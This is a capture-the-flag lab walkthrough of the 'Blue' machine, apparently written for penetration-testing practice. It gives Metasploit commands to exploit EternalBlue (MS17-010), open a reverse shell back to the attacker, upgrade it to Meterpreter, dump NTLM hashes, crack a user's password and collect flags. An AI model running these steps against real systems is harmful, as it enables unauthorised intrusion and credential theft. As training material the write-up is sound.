# Blue Room - Full Penetration Test Walkthrough

## Objective
Scan and learn what exploit this machine is vulnerable to. Complete a full exploitation cycle from reconnaissance through post-exploitation and flag capture.

---

## Phase 1 : Reconnaissance:

### Initial Network scan
```bash
sudo nmap -sC -sv <TARGET_IP>
```

**Findings:**
- Port 445 (SMB): Windows Server 2012 R2
- Port 3389 (RDP): Available but requires credentials
- Port 5985 (WinRM): Available but requires credentials

**Key Observation:** Multiple ports open, but SMB on 445 is the best entry point for unauthenticated exploitation.


## Phase 2 : Vulnerability Identification

### Scan for EternalBlue (MS17-010)
```bash
msfconsole
msf6> search eternalblue
msf6> use auxiliary/scanner/smb/smb_ms17_010
msf6> set RHOSTS <TARGET_IP>
msf6> run
```

**Result:** Host is VULNERABLE to MS17-010

**Why EternalBlue?**
- Kernel vulnerability in SMB (port 445)
- **Unauthenticated RCE** (no credentials needed)
- Direct system access vs RDP/WinRM (which require valid credentials)
- This is the initial entry point

RDP (port 3389) and WinRM (port 5985), both can be used for lateral movement or RCE but those are management tools. They are typically used after we have valid credentials. EternalBlue is different, it's a kernel vulnerability in SMB that doesn't require credentials. It gives us unauthenticated RCE.

---

## Phase 3 : Exploitation

### Initial shell via EternalBlue
```bash
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6> set payload windows/x64/shell/reverse_tcp
msf6> set rhosts <TARGET_IP>
msf6> SET lhost <YOUR_IP>
msf6> run
msf6> CTRL Z
```

---

## Phase 4 : Privilege Verification & Escalation

### Verify Current Privileges
```bash
C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM
```

### Upgrade Shell to Meterpreter
```bash
msf6> search shell_to_meterpreter
msf6> use post/multi/manage/shell_to_meterpreter
msf6> show options
msf6> set session 1
msf6> set LHOST <YOUR_IP>
msf6> run
msf6> sesssions
msf6> sessions -i 2
```

**Result:** Meterpreter session 2 opened

### Verify Meterpreter Session
```bash
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
```

### Process Migration
```bash
meterpreter> ps
meterpreter> migrate 1064
```

**Decision Logic:**
- Initially tried migrating to PID 1144 (failed with error 1300)
- Migrated to PID 1064 (svchost.exe) - Success
- **Why migrate?** For stability during post-exploitation activities
- **Why svchost?** Multiple instances exist; if one crashes, system remains stable

---

## Phase 5 : Post-Exploitation - Credential Extraction

### Extract Password Hashes
```bash
meterpreter> hashdump
```

**NTLM Hash Format:** `username:RID:LM_hash:NTLM_hash:::`

### Crack Jon's Password
- Hash: `ffb43f0de35be4d9917ac0cc8ad57f8d`
- Tool: crackstation.net

**Decision Logic:**
- **Why online first?** Fast, free, instant results if hash exists in database
- **Fallback:** John the Ripper (slower, uses wordlists)
- **Result:** Password found immediately

---

## Phase 6: Flag Capture

### Flag 1 - System Root
```bash
C:\> type flag1.txt
```

**Location:** C:\ (system root)
**Accessibility:** Accessible with SYSTEM privileges

### Flag 2 - Password Storage Location
```bash
C:\Windows\System32\config> type flag2.txt
```

**Location:** C:\Windows\System32\config\
**Why here?** Windows stores SAM (Security Account Manager) database here - critical for credential storage
**Accessibility:** Requires SYSTEM/admin privileges

### Flag 3 - Administrator Documents
```bash
C:\> where /r C:\ flag3.txt
C:\Users\Jon\Documents> type flag3.txt
```

**Location:** C:\Users\Jon\Documents\
**Why here?** Administrators often store sensitive files in user directories
**Accessibility:** Required SYSTEM privileges to read (file permissions)

---

## Key Learnings & Decision Logic

### What Went Right
1. **Correct vulnerability identification:** EternalBlue is unauthenticated, best entry point
2. **Adaptive payload selection:** Switched from Meterpreter to shell when experiencing timeouts
3. **Port flexibility:** Changed LPORT from 4444 to 7777 (non-default port worked better)

### What Went Wrong & Lessons
1. **Unnecessary process migration:** After converting to Meterpreter, migrated to a process linked to cmd.exe
   - **Impact:** Caused shell timeouts and session instability
   - **Fix:** If current process is stable, don't migrate unless necessary
   
2. **Initial Meterpreter payload choice:** Tried Meterpreter first when shell was more reliable
   - **Impact:** Repeated timeouts, wasted time
   - **Fix:** Start simple (shell), escalate (Meterpreter) only when needed

### Future Approach
- Use basic shell payloads for initial access on unreliable connections
- Only migrate processes if current one is unstable
- Test non-default ports (7777, 8888) before assuming 4444/443 will work
- Keep working sessions - don't unnecessarily escalate/migrate if not needed

---

## Timeline Summary
1. Reconnaissance - Identified SMB (445) as entry point
2. Vulnerability Scan - Confirmed EternalBlue vulnerability
3. Initial Exploitation - Gained shell access
4. Privilege Verification - Confirmed SYSTEM access
5. Meterpreter Upgrade - Converted shell to Meterpreter
6. Process Stabilization - Migrated to stable svchost process
7. Credential Extraction - Dumped hashes, cracked Jon's password
8. Flag Capture - Collected all 3 flags from different system locations

---

## Tools Used
- **nmap** - Network reconnaissance
- **Metasploit Framework** - Exploitation & post-exploitation
- **msfvenom** - Payload generation (part of Metasploit)
- **crackstation.net** - NTLM hash cracking

---

## References
- MS17-010 (EternalBlue): CVE-2017-0143 to CVE-2017-0148
- NTLM Hash Format documentation
- Windows SAM database location and structure